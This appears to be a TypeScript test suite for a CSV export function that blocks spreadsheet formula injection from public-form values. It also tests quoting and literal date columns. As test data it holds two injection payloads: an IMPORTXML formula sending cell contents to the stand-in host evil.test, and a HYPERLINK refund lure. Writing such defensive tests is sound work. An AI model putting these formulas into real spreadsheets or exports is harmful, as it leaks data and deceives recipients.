import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { sanitizeTextCell, toCsv } from "../../src/lib/portal/csv.ts";

/**
 * The First Edition export is a file of values typed by strangers into a public
 * form, opened in the owner's spreadsheet. That is the whole threat model.
 */
describe("the list export cannot execute in a spreadsheet", () => {
  it("neutralises every character a spreadsheet treats as a formula", () => {
    for (const dangerous of ["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"]) {
      assert.equal(
        sanitizeTextCell(dangerous).startsWith("'"),
        true,
        `${JSON.stringify(dangerous)} was left executable`,
      );
    }
  });

  it("neutralises the attacks people actually use", () => {
    const exfiltrate = '=IMPORTXML(CONCAT("http://evil.test/?v=",A1),"//a")';
    const link = '=HYPERLINK("http://evil.test","Click for a refund")';

    assert.equal(sanitizeTextCell(exfiltrate)[0], "'");
    assert.equal(sanitizeTextCell(link)[0], "'");
  });

  it("leaves ordinary values alone", () => {
    for (const safe of ["Sam", "sam@example.com", "O'Neill", "3 - 5 years", ""]) {
      assert.equal(sanitizeTextCell(safe), safe, `${safe} was needlessly altered`);
    }
  });

  it("escapes quotes, commas and newlines to RFC 4180", () => {
    const csv = toCsv([{ v: 'a "quoted", multi\nline' }], [
      { header: "v", value: (r) => r.v },
    ]);

    assert.equal(csv, 'v\r\n"a ""quoted"", multi\nline"');
  });

  it("puts a formula-safe value through escaping too", () => {
    // The prefix must survive quoting rather than being applied after it.
    const csv = toCsv([{ v: "=1+1,2" }], [{ header: "v", value: (r) => r.v }]);
    assert.equal(csv, 'v\r\n"\'=1+1,2"');
  });

  it("does not prefix values marked literal", () => {
    // Dates and numbers are ours, not a stranger's, and a leading quote would
    // stop a spreadsheet reading them as dates.
    const csv = toCsv([{ d: "2026-08-24T00:00:00.000Z" }], [
      { header: "joined", value: (r) => r.d, literal: true },
    ]);

    assert.doesNotMatch(csv, /'/);
  });

  it("renders an empty list as headers alone, not as nothing", () => {
    const csv = toCsv([], [{ header: "email", value: () => "" }]);
    assert.equal(csv, "email");
  });
});
